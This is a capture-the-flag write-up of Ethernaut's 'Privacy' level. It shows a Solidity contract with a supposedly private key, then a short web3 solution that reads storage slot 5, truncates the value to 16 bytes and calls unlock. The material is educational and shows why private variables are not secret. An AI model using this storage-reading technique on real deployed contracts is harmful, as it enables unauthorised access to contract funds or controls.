# Level 12 - Privacy

### Objective

The objective of this level is as follows:

1. Unlock the contract

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

### Solution

In this level, we take advantage of the fact that `unlock` uses index 2 of `data` - a `bytes32` array. After some calculation, we arrive at the slot number of `key`:

```
key = await web3.eth.getStorageAt(contract.address, 5)

```

In this form, `key` is `byte32`; however, `require(_key == bytes16(data[2]))` only returns the first 16 bytes. Thus, we must convert `key` to `byte16` with prefix `0x`:

```
key = key.slice(0, 34)

```

Next, we can `unlock` the contract with the `key`:

```
await contract.unlock(key)

```

Finally, we can verify that the contract is unlocked:

```
await contract.locked()

```

Done!
